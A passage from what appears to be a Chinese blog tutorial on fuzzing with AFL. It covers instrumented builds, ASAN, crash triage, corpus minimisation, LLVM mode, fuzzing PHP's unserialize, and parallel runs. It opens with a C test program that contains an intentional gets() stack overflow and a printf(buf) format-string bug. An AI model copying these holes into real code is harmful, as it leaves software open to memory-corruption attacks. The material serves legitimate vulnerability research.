class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'A'</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">'F'</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"it is good!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用afl-gcc进行插桩编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc -g -o ./zerotest/vuln ./zerotest/vuln.c</span><br></pre></td></tr></table></figure><p>PS:<br>如果目标程序中有Makefile，那么分两种情况:</p><ol><li>程序是用autoconf构建，那么此时只需要执行如下即可</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure CC=&quot;afl-gcc&quot; CXX=&quot;afl-g++&quot;</span><br></pre></td></tr></table></figure><p>此外，还可以执行如下语句设置LD_LIBRARY_PATH让程序加载经过AFL插桩的.so文件，进行静态构建而不是动态链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --disable-shared CC=&quot;afl-gcc&quot; CXX=&quot;afl-g++&quot;</span><br></pre></td></tr></table></figure><ol start="2"><li>程序不是用autoconf构建，那么直接修改Makefile文件中的编译器为<code>afl-gcc/g++</code>。</li></ol><p>为了后期更好的分析crash，在此处可以开启Address Sanitizer(ASAN)这个内存检测工具，此工具可以更好的检测出缓存区溢出、UAF 等内存漏洞，开启方法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AFL_USE_ASAN=1 ./configure CC=afl-gcc CXX=afl-g++ LD=afl-gcc--disable-shared</span><br><span class="line">AFL_USE_ASAN=1 make</span><br></pre></td></tr></table></figure><p>不使用 AFL 编译插桩时，可使用以下方式开启 Address Sanitizer。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure CC=gcc CXX=g++ CFLAGS=&quot;-g -fsanitize=address&quot;</span><br><span class="line">make</span><br></pre></td></tr></table></figure><h4 id="1-2-开始fuzz"><a href="#1-2-开始fuzz" class="headerlink" title="1.2 开始fuzz"></a>1.2 开始fuzz</h4><p>fuzz的语法一般情况是两种:</p><ol><li>直接从stdin读取输入的目标程序</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]</span><br></pre></td></tr></table></figure><ol start="2"><li>从文件读取输入的目标程序，@@就是占位符，表示输入替换的位置</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure><p>此处我采用第一种方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m 300 -i ./zerotest/fuzz_in -o ./zerotest/fuzz_out ./zerotest/vuln -f</span><br></pre></td></tr></table></figure><p>PS: 常见参数的含义如下</p><ul><li>-f参数表示：testcase的内容会作为afl_test的stdin</li><li>-m参数表示分配的内存空间</li><li>-i 指定测试样本的路径</li><li>-o 指定输出结果的路径</li><li>/dev/null 使错误信息不输出到屏幕</li><li>-t：设置程序运行超时值，单位为 ms</li><li>-M：运行主(Master) Fuzzer</li><li>-S：运行从属(Slave) Fuzzer</li></ul><h4 id="1-3-fuzz的结果"><a href="#1-3-fuzz的结果" class="headerlink" title="1.3 fuzz的结果"></a>1.3 fuzz的结果</h4><p><img src="https://i.loli.net/2019/05/15/5cdc17c37edfd11335.png" alt="60889809-4D22-4C14-AF3C-E98D2C5EB60D.png"></p><p>从界面上主要注意以下几点:</p><ol><li>last new path 如果报错那么要及时修正命令行参数，不然继续fuzz也是徒劳（因为路径是不会改变的）；</li><li>cycles done 如果变绿就说明后面及时继续fuzz，出现crash的几率也很低了，可以选择在这个时候停止</li><li>uniq crashes 代表的是crash的数量</li></ol><h4 id="1-4-crash分析"><a href="#1-4-crash分析" class="headerlink" title="1.4 crash分析"></a>1.4 crash分析</h4><p>PS: xxd命令的作用就是将一个文件以十六进制的形式显示出来</p><p><img src="https://i.loli.net/2019/05/15/5cdc17e6d731a12930.png" alt="1FF9D91F-F823-4DF7-B716-C68B58134D65.png"></p><p>可以看到已经得到的几个crash文件，那么分析的话只需要将其作为之前vuln文件的输入，使用gdb调试分析就可以得到详细结果了，但是在这之前可以使用xxd看一下其中数据的内容做一个初步的判断。</p><p>分别看一下这几个crash的信息</p><ol><li>可以看到应该是满足了开头是F且字符串长度为6的异常退出情况<br><img src="https://i.loli.net/2019/05/15/5cdc1819e028a13399.png" alt="63005FA6-59BD-48BD-8B19-F5EF08C84D4E.png"></li><li>看这个数据情况可能是栈溢出<br><img src="https://i.loli.net/2019/05/15/5cdc18323104a44582.png" alt="D74734D1-F13E-4256-B47C-260817BE102E.png"></li><li>栈溢出<br><img src="https://i.loli.net/2019/05/15/5cdc1890b95d940410.png" alt="B909DBCF-66FF-4C37-BF39-1ED413A6B0C3.png"></li><li>符合首字符为A且栈溢出<br><img src="https://i.loli.net/2019/05/15/5cdc18a6085c235233.png" alt="8213201E-7B35-45D7-9057-5493978CCABB.png"></li><li>格式化字符串?可能<br><img src="https://i.loli.net/2019/05/15/5cdc18bd9a06782571.png" alt="C7F22A69-F1E6-4863-B9BD-08D88A82C789.png"></li><li>符合首字符为A且字符串长度为66的异常退出情况<br><img src="https://i.loli.net/2019/05/15/5cdc18d239e5642604.png" alt="41BAF060-7874-4D52-93CC-49FD86AF26D3.png"></li></ol><p>主要参考:<br><a href="https://xz.aliyun.com/t/4314" target="_blank" rel="noopener">《初探Fuzz-AFL》</a></p><h4 id="1-5-语料库蒸馏-Corpus-Distillation"><a href="#1-5-语料库蒸馏-Corpus-Distillation" class="headerlink" title="1.5 语料库蒸馏(Corpus Distillation)"></a>1.5 语料库蒸馏(Corpus Distillation)</h4><p>一般来说在进行fuzz之前构建一份有效的语料库是十分有必要的，这将作为程序开始时的种子。</p><p>语料库的信息来源主要如下:</p><ul><li>使用项目自身提供的测试用例</li><li>目标程序bug提交页面</li><li>使用格式转换器，用从现有的文件格式生成一些不容易找到的文件格式：</li><li>afl源码的testcases目录下提供了一些测试用例</li><li>其他开源的语料库</li></ul><p>收集完后可以使用afl提供的工具来对语料库进行进一步的处理:</p><ol><li>afl-cmin: 移除执行相同代码的输入文件<br>afl-cmin的核心思想是: 尝试找到与语料库全集具有相同覆盖范围的最小子集。<br>它一般的两种执行模式是:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure><ol start="2"><li>afl-tmin: 减小单个输入文件的大小<br>它有两种工作模式: instrumented mode和crash mode。默认的工作方式是instrumented mode</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># instrumented mode</span><br><span class="line">afl-tmin -i input_file -o output_file -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># crash mode 将会剔除导致crash的文件</span><br><span class="line">afl-tmin -x -i input_file -o output_file -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure><p>由于只能针对单个目标进行使用，因此使用如下shell脚本进行批量处理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> *; <span class="keyword">do</span> afl-tmin -i <span class="variable">$i</span> -o tmin-<span class="variable">$i</span> -- ~/path/to/tested/program [params] @@; <span class="keyword">done</span>;</span><br></pre></td></tr></table></figure><p>或者修改如下的Python脚本进行预处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmin</span><span class="params">()</span>:</span></span><br><span class="line">    command = <span class="string">' -m 300 -t 5000 ./utilities/magick convert @@ /dev/null'</span> </span><br><span class="line">    os.system(<span class="string">'afl-cmin -i seeds/tmin -o seeds/cmin '</span> + command)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tmin</span><span class="params">()</span>:</span></span><br><span class="line">    command = <span class="string">' -m 300 -t 5000 ./utilities/magick convert @@ /dev/null'</span> </span><br><span class="line">    seed_list = os.listdir(<span class="string">'seeds/all_format'</span>)</span><br><span class="line">    <span class="keyword">for</span> seed <span class="keyword">in</span> seed_list:</span><br><span class="line">        in_file = os.path.join(<span class="string">'seeds/all_format'</span>, seed)</span><br><span class="line">        out_file = os.path.join(<span class="string">'seeds/tmin'</span>, seed)</span><br><span class="line">        <span class="keyword">if</span> os.path.getsize(in_file) &gt; <span class="number">1024</span>*<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> os.path.getsize(in_file) &lt; <span class="number">1024</span>*<span class="number">3</span> <span class="keyword">and</span> <span class="keyword">not</span> seed.endswith(<span class="string">'.txt'</span>):</span><br><span class="line">                os.system(<span class="string">'afl-tmin -i '</span> + in_file + <span class="string">' -o '</span> + out_file + command)</span><br><span class="line">                print(<span class="string">'afl-tmin -i '</span> + in_file + <span class="string">' -o '</span> + out_file + command)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">elif</span> os.path.getsize(in_file) &gt; <span class="number">0</span>:</span><br><span class="line">            shutil.copyfile(in_file,out_file)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(origin_seeds)</span>:</span></span><br><span class="line">    seed_list = os.listdir(origin_seeds)</span><br><span class="line">    <span class="keyword">for</span> seed <span class="keyword">in</span> seed_list:</span><br><span class="line">        seed_in = os.path.join(origin_seeds, seed)</span><br><span class="line">        file_name = (os.path.splitext(seed)[<span class="number">0</span>])</span><br><span class="line">        coder_list = os.listdir(<span class="string">'coders'</span>)</span><br><span class="line">        <span class="keyword">for</span> cfile <span class="keyword">in</span> coder_list:</span><br><span class="line">            <span class="keyword">if</span> cfile.endswith(<span class="string">'.c'</span>):</span><br><span class="line">                extern = cfile[:cfile.find(<span class="string">'.c'</span>)]</span><br><span class="line">                seed_out = <span class="string">'seeds/all_format/'</span> + file_name + <span class="string">'.'</span> + extern</span><br><span class="line">                os.system(<span class="string">'utilities/magick convert '</span> + seed_in + <span class="string">' '</span> + seed_out)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: '</span> + sys.argv[<span class="number">0</span>] + <span class="string">' origin_seeds_dir'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        origin_seeds_dir = sys.argv[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.mkdir(<span class="string">'seeds'</span>)</span><br><span class="line">            seeds_path = os.path.join(os.path.abspath(<span class="string">'.'</span>),<span class="string">'seeds'</span>)</span><br><span class="line">            os.mkdir(os.path.join(seeds_path,<span class="string">'all_format'</span>))</span><br><span class="line">            os.mkdir(os.path.join(seeds_path,<span class="string">'cmin'</span>))</span><br><span class="line">            os.mkdir(os.path.join(seeds_path,<span class="string">'tmin'</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'make dir fail!'</span></span><br><span class="line">        convert(origin_seeds_dir)</span><br><span class="line">        tmin()</span><br><span class="line">        cmin()</span><br></pre></td></tr></table></figure><p>预处理脚本来自:<a href="http://0x4c43.cn/2018/0722/use-afl-for-fuzz-testing/" target="_blank" rel="noopener">《使用 AFL 进行模糊测试》</a></p><h3 id="2-LLVM-Mode模式"><a href="#2-LLVM-Mode模式" class="headerlink" title="2. LLVM Mode模式"></a>2. LLVM Mode模式</h3><h4 id="2-1-启用llvm"><a href="#2-1-启用llvm" class="headerlink" title="2.1 启用llvm"></a>2.1 启用llvm</h4><p>LLVM Mode模式编译程序可以获得更快的Fuzzing速度，因此针对大型项目可以考虑启用。</p><p>下载必要的安装包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://releases.llvm.org/8.0.0/llvm-8.0.0.src.tar.xz</span><br><span class="line">wget http://releases.llvm.org/8.0.0/compiler-rt-8.0.0.src.tar.xz</span><br><span class="line">wget http://releases.llvm.org/8.0.0/clang-tools-extra-8.0.0.src.tar.xz</span><br><span class="line">wget http://releases.llvm.org/8.0.0/cfe-8.0.0.src.tar.xz</span><br></pre></td></tr></table></figure><p>解压缩</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xz -d ./*</span><br><span class="line">tar xvf cfe-8.0.0.src.tar</span><br><span class="line">tar xvf clang-tools-extra-8.0.0.src.tar</span><br><span class="line">tar xvf llvm-8.0.0.src.tar</span><br><span class="line">tar xvf compiler-rt-8.0.0.src.tar</span><br></pre></td></tr></table></figure><p>源码合并</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mv cfe-8.0.0.src clang</span><br><span class="line">mv clang llvm-8.0.0.src/tools</span><br><span class="line">mv clang-tools-extra-8.0.0.src extra</span><br><span class="line">mv extra llvm-8.0.0.src/tools/clang</span><br><span class="line">mv compiler-rt-8.0.0.src compiler-rt</span><br><span class="line">mv compiler-rt llvm-8.0.0.src/projects</span><br></pre></td></tr></table></figure><p>编译安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir build-8.0</span><br><span class="line">cmake ../llvm-8.0.0.src/</span><br><span class="line">cmake --build .</span><br><span class="line">cmake --build . --target install</span><br><span class="line">cmake -DCMAKE_INSTALL_PREFIX=/tmp/llvm -P cmake_install.cmake</span><br></pre></td></tr></table></figure><p>上面的编译安装对硬件配置和硬盘的空间要求比较高，所以你可以直接使用源进行安装，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install llvm clang</span><br></pre></td></tr></table></figure><p>编译安装afl的llvm模块<br>(我的使用的是kali linux 2019.1进行编译的，clang版本过高会失败，使用clang++也会失败，所以最终发现下面方法可行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd afl/llvm_mode</span><br><span class="line">export CXX=/usr/bin/g++</span><br><span class="line">export CC=/usr/bin/clang-6.0</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>因为clang没有办法使用<code>update-alternatives</code>，因此我直接修改软连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/bin/clang-6.0 /usr/bin/clang</span><br><span class="line">ln -sb /usr/bin/clang++-6.0 /usr/bin/clang++</span><br></pre></td></tr></table></figure><p>之后就可以正常使用afl-clang-fast了<br><img src="https://i.loli.net/2019/05/15/5cdc18ecc0cc062251.png" alt="9B83B620-E1A2-420F-81CA-FC6C4777F4EB.png"></p><p>其实以上均太费劲，还有更简单的方法，kali linux的源中包含了afl，所以可以直接apt进行安装，装好之后afl-clang-fast也就有了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install afl</span><br></pre></td></tr></table></figure><h4 id="2-2-使用LLVM-Mode模式进行fuzz"><a href="#2-2-使用LLVM-Mode模式进行fuzz" class="headerlink" title="2.2 使用LLVM Mode模式进行fuzz"></a>2.2 使用LLVM Mode模式进行fuzz</h4><p>编译插桩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali-z ~/Desktop/fuzz/afl$ ./afl-clang-fast -g -o ./zerotest/vuln-fast ./zerotest/vuln.c</span><br></pre></td></tr></table></figure><p>之后重复上面的方式进行fuzz即可，接下来展示一个使用此模式fuzz php内核代码的例子。</p><h5 id="1-下载目标代码"><a href="#1-下载目标代码" class="headerlink" title="1. 下载目标代码"></a>1. 下载目标代码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/php/php-src/archive/php-7.2.11.tar.gz &amp;&amp; tar xf php-7.2.11.tar.gz</span><br></pre></td></tr></table></figure><h5 id="2-进行编译插桩"><a href="#2-进行编译插桩" class="headerlink" title="2. 进行编译插桩"></a>2. 进行编译插桩</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd php-src-php-7.2.11</span><br><span class="line">./buildconf --force</span><br><span class="line">CC=afl-clang-fast CXX=afl-clang-fast++ ./configure</span><br><span class="line">AFL_USE_ASAN=1 make</span><br></pre></td></tr></table></figure><p>PS: 如果报错缺失libconv，则在<code>Makefile</code>中的<code>EXTRA_LIBS =</code>添加<code>-liconv</code></p><h5 id="3-进行源代码的修改"><a href="#3-进行源代码的修改" class="headerlink" title="3. 进行源代码的修改"></a>3. 进行源代码的修改</h5><p>未修改之前  sapi/cli/php_cli.c<br><img src="https://i.loli.net/2019/05/15/5cdc19514eecd50209.png" alt="BB750539-176B-4A52-A437-D370814C7CCE.png"><br>修改之后   sapi/cli/php_cli.c<br><img src="https://i.loli.net/2019/05/15/5cdc1963129fc31389.png" alt="C21FA188-6FFE-440A-B0AD-BA0F8C60312C.png"><br>修改完之后执行如下进行rebuild</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AFL_USE_ASAN=1 make</span><br></pre></td></tr></table></figure><p>PS: 之所以进行这样的修改，是因为我们使用<code>php -r</code>来eval php string，因此定位到<code>sapi/cli/php_cli.c</code>进行代码的修改离开提升后期fuzz的效率。</p><h5 id="4-构造一个输入点"><a href="#4-构造一个输入点" class="headerlink" title="4. 构造一个输入点"></a>4. 构造一个输入点</h5><p>我们想在fuzz的时候从stdin进行数据的输入，因此构造如下输入点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize(file_get_contents(“php://stdin”));</span><br></pre></td></tr></table></figure><h5 id="5-根据上述的构造点构造输入数据"><a href="#5-根据上述的构造点构造输入数据" class="headerlink" title="5. 根据上述的构造点构造输入数据"></a>5. 根据上述的构造点构造输入数据</h5><p>此处账户要考虑构造不同类类型的输入数据，构造如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir serialized_data &amp;&amp; cd serialized_data</span><br><span class="line">../sapi/cli/php -r &apos;echo serialize(&quot;a&quot;);&apos; &gt; string</span><br><span class="line">../sapi/cli/php -r &apos;echo serialize(1);&apos; &gt; number</span><br><span class="line">../sapi/cli/php -r &apos;echo serialize([1,2]);&apos; &gt; array_of_num</span><br><span class="line">../sapi/cli/php -r &apos;echo serialize([&quot;1&quot;,&quot;2&quot;]);&apos; &gt; array_of_str</span><br><span class="line">../sapi/cli/php -r &apos;echo serialize([[&quot;1&quot;,&quot;2&quot;],[&quot;3&quot;,&quot;4&quot;],[1,2]]);&apos; &gt; array_of_array</span><br><span class="line">echo &apos;O:6:&quot;zeroyu&quot;:1:&#123;s:4:&quot;test&quot;;O:7:&quot;npusec2&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&apos; &gt; class</span><br></pre></td></tr></table></figure><h5 id="6-开始fuzz"><a href="#6-开始fuzz" class="headerlink" title="6. 开始fuzz"></a>6. 开始fuzz</h5><p>为了从地址清理(ASAN)中获得有用的结果，有必要设置一个环境变量，以便PHP禁用其自定义内存分配器，从而使内存安全问题对ASAN可见。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE_ZEND_ALLOC=0 screen -S zeroyu</span><br></pre></td></tr></table></figure><p>使用screen可以随时进入查看fuzz的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -r zeroyu</span><br></pre></td></tr></table></figure><p>使用如下命令开始fuzz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd..</span><br><span class="line">afl-fuzz -i serialized_data -o basic_fuzz -m none -- ./sapi/cli/php -r &apos;unserialize(file_get_contents(&quot;php://stdin&quot;));&apos;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/15/5cdc197fb417a82164.png" alt="11B4692E-E516-4743-9FAC-B39AB1C03ED0.png"></p><h5 id="7-分析crash"><a href="#7-分析crash" class="headerlink" title="7. 分析crash"></a>7. 分析crash</h5><p>用是使用如下bash脚本来寻找可能是bug的crash，因为有些是良性的crash，是由于ASAN无法分配足够的内存。这是因为ASAN需要额外的内存来跟踪所有分配，而精心编制的序列化对象可能会触发大内存分配。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> FILE <span class="keyword">in</span> $(ls id*); <span class="keyword">do</span> cat <span class="variable">$FILE</span> | ../../sapi/cli/php -r <span class="string">"unserialize(file_get_contents('php://stdin'));"</span> 2&gt;&amp;1 | grep -E <span class="string">"SUMMARY|ERROR"</span> | grep -v <span class="string">"LargeMmap"</span> &amp;&amp; <span class="built_in">echo</span> <span class="variable">$FILE</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>参考: <a href="https://www.tripwire.com/state-of-security/vert/fuzzing-php-for-fun-and-profit/" target="_blank" rel="noopener">《Fuzzing PHP for Fun and Profit》</a></p><h3 id="3-黑盒测试"><a href="#3-黑盒测试" class="headerlink" title="3. 黑盒测试"></a>3. 黑盒测试</h3><p>参考：<a href="https://paper.tuisec.win/detail/45e6d0a790d79da" target="_blank" rel="noopener">《AFL漏洞挖掘技术漫谈（一）：用AFL开始你的第一次Fuzzing》</a></p><h3 id="4-并行测试"><a href="#4-并行测试" class="headerlink" title="4. 并行测试"></a>4. 并行测试</h3><h4 id="4-1-单系统并行"><a href="#4-1-单系统并行" class="headerlink" title="4.1 单系统并行"></a>4.1 单系统并行</h4><p>查看系统核心数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/cpuinfo| grep &quot;cpu cores&quot;| uniq</span><br></pre></td></tr></table></figure><p>afl-fuzz并行Fuzzing，一般的做法是通过-M参数指定一个主Fuzzer(Master Fuzzer)、通过-S参数指定多个从Fuzzer(Slave Fuzzer)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ screen afl-fuzz -i testcases/ -o sync_dir/ -M fuzzer1 -- ./program</span><br><span class="line">$ screen afl-fuzz -i testcases/ -o sync_dir/ -S fuzzer2 -- ./program</span><br><span class="line">$ screen afl-fuzz -i testcases/ -o sync_dir/ -S fuzzer3 -- ./program</span><br></pre></td></tr></table></figure><p>PS: -o指定的是一个同步目录，并行测试中，所有的Fuzzer将相互协作，在找到新的代码路径时，相互传递新的测试用例。所以不用担心重复的问题</p><p>两个辅助工具:</p><ul><li><code>afl-whatsup</code>工具可以查看每个fuzzer的运行状态和总体运行概况，加上-s选项只显示概况，其中的数据都是所有fuzzer的总和。</li><li><code>afl-gotcpu</code>工具可以查看每个核心使用状态。</li></ul><h4 id="4-2-多系统并行"><a href="#4-2-多系统并行" class="headerlink" title="4.2 多系统并行"></a>4.2 多系统并行</h4><p>压缩每个fuzzer实例目录中queue下的文件，通过如下SSH脚本同步分发到其他机器上解压。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 